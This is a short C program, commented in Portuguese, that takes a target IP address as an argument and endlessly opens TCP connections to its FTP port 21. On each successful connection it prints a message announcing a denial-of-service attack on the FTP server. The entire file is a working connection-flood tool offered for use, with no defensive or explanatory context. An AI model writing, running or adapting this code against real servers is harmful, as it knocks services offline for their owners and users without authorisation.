#include <stdio.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <fcntl.h> // for open
#include <unistd.h> // for close

int main(int argc, char *argv[])
{
	int meusocket;
	int conecta;

	int a;
	int x = 0;
	int y = 0;
	int z = 1;
	char * destino;
	destino = argv[1];


	struct sockaddr_in  alvo;
	for(a=x;y<z;a++)
	{
	meusocket = socket(AF_INET, SOCK_STREAM, 0);
	alvo.sin_family = AF_INET;
	alvo.sin_port = htons(21);
	alvo.sin_addr.s_addr = inet_addr(destino);
	
	conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo);

	if(conecta == 0)
	{
		printf("(%d) Realizando DoS no FTP - [ c7dm4n ]\n",a);
	}else{
		printf("Porta fechada!\n");
	}
	}
}
